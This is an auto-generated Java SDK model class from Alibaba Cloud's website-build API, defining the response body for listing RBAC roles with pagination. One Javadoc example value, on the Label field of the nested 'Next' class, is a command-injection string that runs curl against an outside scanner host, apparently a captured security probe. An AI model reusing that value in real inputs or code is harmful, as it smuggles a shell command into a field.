// This file is auto-generated, don't edit it. Thanks.
package com.aliyun.websitebuild20250429.models;

import com.aliyun.tea.*;

public class ListRbacRolesResponseBody extends TeaModel {
    /**
     * <strong>example:</strong>
     * <p>{}</p>
     */
    @NameInMap("AccessDeniedDetail")
    public String accessDeniedDetail;

    /**
     * <strong>example:</strong>
     * <p>False</p>
     */
    @NameInMap("AllowRetry")
    public Boolean allowRetry;

    /**
     * <strong>example:</strong>
     * <p>or</p>
     */
    @NameInMap("AppName")
    public String appName;

    /**
     * <strong>example:</strong>
     * <p>ERROR-oo1</p>
     */
    @NameInMap("DynamicCode")
    public String dynamicCode;

    /**
     * <strong>example:</strong>
     * <p>SYSTEM_ERROR</p>
     */
    @NameInMap("DynamicMessage")
    public String dynamicMessage;

    @NameInMap("ErrorArgs")
    public java.util.List<?> errorArgs;

    /**
     * <strong>example:</strong>
     * <p>10</p>
     */
    @NameInMap("MaxResults")
    public Integer maxResults;

    @NameInMap("Module")
    public ListRbacRolesResponseBodyModule module;

    /**
     * <strong>example:</strong>
     * <p>0l45bkwM022Dt+rOvPi/oQ==</p>
     */
    @NameInMap("NextToken")
    public String nextToken;

    /**
     * <strong>example:</strong>
     * <p>6C6B99AC-39EC-5350-874C-204128C905E6</p>
     */
    @NameInMap("RequestId")
    public String requestId;

    /**
     * <strong>example:</strong>
     * <p>SYSTEM.ERROR</p>
     */
    @NameInMap("RootErrorCode")
    public String rootErrorCode;

    /**
     * <strong>example:</strong>
     * <p>系统异常</p>
     */
    @NameInMap("RootErrorMsg")
    public String rootErrorMsg;

    /**
     * <strong>example:</strong>
     * <p>True</p>
     */
    @NameInMap("Synchro")
    public Boolean synchro;

    public static ListRbacRolesResponseBody build(java.util.Map<String, ?> map) throws Exception {
        ListRbacRolesResponseBody self = new ListRbacRolesResponseBody();
        return TeaModel.build(map, self);
    }

    public ListRbacRolesResponseBody setAccessDeniedDetail(String accessDeniedDetail) {
        this.accessDeniedDetail = accessDeniedDetail;
        return this;
    }
    public String getAccessDeniedDetail() {
        return this.accessDeniedDetail;
    }

    public ListRbacRolesResponseBody setAllowRetry(Boolean allowRetry) {
        this.allowRetry = allowRetry;
        return this;
    }
    public Boolean getAllowRetry() {
        return this.allowRetry;
    }

    public ListRbacRolesResponseBody setAppName(String appName) {
        this.appName = appName;
        return this;
    }
    public String getAppName() {
        return this.appName;
    }

    public ListRbacRolesResponseBody setDynamicCode(String dynamicCode) {
        this.dynamicCode = dynamicCode;
        return this;
    }
    public String getDynamicCode() {
        return this.dynamicCode;
    }

    public ListRbacRolesResponseBody setDynamicMessage(String dynamicMessage) {
        this.dynamicMessage = dynamicMessage;
        return this;
    }
    public String getDynamicMessage() {
        return this.dynamicMessage;
    }

    public ListRbacRolesResponseBody setErrorArgs(java.util.List<?> errorArgs) {
        this.errorArgs = errorArgs;
        return this;
    }
    public java.util.List<?> getErrorArgs() {
        return this.errorArgs;
    }

    public ListRbacRolesResponseBody setMaxResults(Integer maxResults) {
        this.maxResults = maxResults;
        return this;
    }
    public Integer getMaxResults() {
        return this.maxResults;
    }

    public ListRbacRolesResponseBody setModule(ListRbacRolesResponseBodyModule module) {
        this.module = module;
        return this;
    }
    public ListRbacRolesResponseBodyModule getModule() {
        return this.module;
    }

    public ListRbacRolesResponseBody setNextToken(String nextToken) {
        this.nextToken = nextToken;
        return this;
    }
    public String getNextToken() {
        return this.nextToken;
    }

    public ListRbacRolesResponseBody setRequestId(String requestId) {
        this.requestId = requestId;
        return this;
    }
    public String getRequestId() {
        return this.requestId;
    }

    public ListRbacRolesResponseBody setRootErrorCode(String rootErrorCode) {
        this.rootErrorCode = rootErrorCode;
        return this;
    }
    public String getRootErrorCode() {
        return this.rootErrorCode;
    }

    public ListRbacRolesResponseBody setRootErrorMsg(String rootErrorMsg) {
        this.rootErrorMsg = rootErrorMsg;
        return this;
    }
    public String getRootErrorMsg() {
        return this.rootErrorMsg;
    }

    public ListRbacRolesResponseBody setSynchro(Boolean synchro) {
        this.synchro = synchro;
        return this;
    }
    public Boolean getSynchro() {
        return this.synchro;
    }

    public static class ListRbacRolesResponseBodyModuleData extends TeaModel {
        /**
         * <strong>example:</strong>
         * <p>2026-05-28T17:59:55Z</p>
         */
        @NameInMap("CreatedAt")
        public String createdAt;

        /**
         * <strong>example:</strong>
         * <p>9953352</p>
         */
        @NameInMap("Id")
        public String id;

        /**
         * <strong>example:</strong>
         * <p>true</p>
         */
        @NameInMap("IsDefault")
        public Boolean isDefault;

        @NameInMap("IsSystem")
        public Boolean isSystem;

        /**
         * <strong>example:</strong>
         * <p>Aliyun:dnm329@cn-shanghai+dir-8452400651</p>
         */
        @NameInMap("Label")
        public String label;

        /**
         * <strong>example:</strong>
         * <p>文件名</p>
         */
        @NameInMap("Name")
        public String name;

        public static ListRbacRolesResponseBodyModuleData build(java.util.Map<String, ?> map) throws Exception {
            ListRbacRolesResponseBodyModuleData self = new ListRbacRolesResponseBodyModuleData();
            return TeaModel.build(map, self);
        }

        public ListRbacRolesResponseBodyModuleData setCreatedAt(String createdAt) {
            this.createdAt = createdAt;
            return this;
        }
        public String getCreatedAt() {
            return this.createdAt;
        }

        public ListRbacRolesResponseBodyModuleData setId(String id) {
            this.id = id;
            return this;
        }
        public String getId() {
            return this.id;
        }

        public ListRbacRolesResponseBodyModuleData setIsDefault(Boolean isDefault) {
            this.isDefault = isDefault;
            return this;
        }
        public Boolean getIsDefault() {
            return this.isDefault;
        }

        public ListRbacRolesResponseBodyModuleData setIsSystem(Boolean isSystem) {
            this.isSystem = isSystem;
            return this;
        }
        public Boolean getIsSystem() {
            return this.isSystem;
        }

        public ListRbacRolesResponseBodyModuleData setLabel(String label) {
            this.label = label;
            return this;
        }
        public String getLabel() {
            return this.label;
        }

        public ListRbacRolesResponseBodyModuleData setName(String name) {
            this.name = name;
            return this;
        }
        public String getName() {
            return this.name;
        }

    }

    public static class ListRbacRolesResponseBodyModuleNext extends TeaModel {
        /**
         * <strong>example:</strong>
         * <p>2020-11-27 16:02:28</p>
         */
        @NameInMap("CreatedAt")
        public String createdAt;

        /**
         * <strong>example:</strong>
         * <p>1000039405002</p>
         */
        @NameInMap("Id")
        public String id;

        /**
         * <strong>example:</strong>
         * <p>false</p>
         */
        @NameInMap("IsDefault")
        public Boolean isDefault;

        @NameInMap("IsSystem")
        public Boolean isSystem;

        /**
         * <strong>example:</strong>
         * <p>label-03\&quot;&amp;$(curl D93PCxNZ.popscan.xaliyun.com)%3B</p>
         */
        @NameInMap("Label")
        public String label;

        /**
         * <strong>example:</strong>
         * <p>docs</p>
         */
        @NameInMap("Name")
        public String name;

        public static ListRbacRolesResponseBodyModuleNext build(java.util.Map<String, ?> map) throws Exception {
            ListRbacRolesResponseBodyModuleNext self = new ListRbacRolesResponseBodyModuleNext();
            return TeaModel.build(map, self);
        }

        public ListRbacRolesResponseBodyModuleNext setCreatedAt(String createdAt) {
            this.createdAt = createdAt;
            return this;
        }
        public String getCreatedAt() {
            return this.createdAt;
        }

        public ListRbacRolesResponseBodyModuleNext setId(String id) {
            this.id = id;
            return this;
        }
        public String getId() {
            return this.id;
        }

        public ListRbacRolesResponseBodyModuleNext setIsDefault(Boolean isDefault) {
            this.isDefault = isDefault;
            return this;
        }
        public Boolean getIsDefault() {
            return this.isDefault;
        }

        public ListRbacRolesResponseBodyModuleNext setIsSystem(Boolean isSystem) {
            this.isSystem = isSystem;
            return this;
        }
        public Boolean getIsSystem() {
            return this.isSystem;
        }

        public ListRbacRolesResponseBodyModuleNext setLabel(String label) {
            this.label = label;
            return this;
        }
        public String getLabel() {
            return this.label;
        }

        public ListRbacRolesResponseBodyModuleNext setName(String name) {
            this.name = name;
            return this;
        }
        public String getName() {
            return this.name;
        }

    }

    public static class ListRbacRolesResponseBodyModule extends TeaModel {
        /**
         * <strong>example:</strong>
         * <p>1</p>
         */
        @NameInMap("CurrentPageNum")
        public Integer currentPageNum;

        @NameInMap("Data")
        public java.util.List<ListRbacRolesResponseBodyModuleData> data;

        @NameInMap("Next")
        public ListRbacRolesResponseBodyModuleNext next;

        /**
         * <strong>example:</strong>
         * <p>False</p>
         */
        @NameInMap("NextPage")
        public Boolean nextPage;

        /**
         * <strong>example:</strong>
         * <p>50</p>
         */
        @NameInMap("PageSize")
        public Integer pageSize;

        /**
         * <strong>example:</strong>
         * <p>False</p>
         */
        @NameInMap("PrePage")
        public Boolean prePage;

        /**
         * <strong>example:</strong>
         * <p>False</p>
         */
        @NameInMap("ResultLimit")
        public Boolean resultLimit;

        /**
         * <strong>example:</strong>
         * <p>1</p>
         */
        @NameInMap("TotalItemNum")
        public Integer totalItemNum;

        /**
         * <strong>example:</strong>
         * <p>1</p>
         */
        @NameInMap("TotalPageNum")
        public Integer totalPageNum;

        public static ListRbacRolesResponseBodyModule build(java.util.Map<String, ?> map) throws Exception {
            ListRbacRolesResponseBodyModule self = new ListRbacRolesResponseBodyModule();
            return TeaModel.build(map, self);
        }

        public ListRbacRolesResponseBodyModule setCurrentPageNum(Integer currentPageNum) {
            this.currentPageNum = currentPageNum;
            return this;
        }
        public Integer getCurrentPageNum() {
            return this.currentPageNum;
        }

        public ListRbacRolesResponseBodyModule setData(java.util.List<ListRbacRolesResponseBodyModuleData> data) {
            this.data = data;
            return this;
        }
        public java.util.List<ListRbacRolesResponseBodyModuleData> getData() {
            return this.data;
        }

        public ListRbacRolesResponseBodyModule setNext(ListRbacRolesResponseBodyModuleNext next) {
            this.next = next;
            return this;
        }
        public ListRbacRolesResponseBodyModuleNext getNext() {
            return this.next;
        }

        public ListRbacRolesResponseBodyModule setNextPage(Boolean nextPage) {
            this.nextPage = nextPage;
            return this;
        }
        public Boolean getNextPage() {
            return this.nextPage;
        }

        public ListRbacRolesResponseBodyModule setPageSize(Integer pageSize) {
            this.pageSize = pageSize;
            return this;
        }
        public Integer getPageSize() {
            return this.pageSize;
        }

        public ListRbacRolesResponseBodyModule setPrePage(Boolean prePage) {
            this.prePage = prePage;
            return this;
        }
        public Boolean getPrePage() {
            return this.prePage;
        }

        public ListRbacRolesResponseBodyModule setResultLimit(Boolean resultLimit) {
            this.resultLimit = resultLimit;
            return this;
        }
        public Boolean getResultLimit() {
            return this.resultLimit;
        }

        public ListRbacRolesResponseBodyModule setTotalItemNum(Integer totalItemNum) {
            this.totalItemNum = totalItemNum;
            return this;
        }
        public Integer getTotalItemNum() {
            return this.totalItemNum;
        }

        public ListRbacRolesResponseBodyModule setTotalPageNum(Integer totalPageNum) {
            this.totalPageNum = totalPageNum;
            return this;
        }
        public Integer getTotalPageNum() {
            return this.totalPageNum;
        }

    }

}
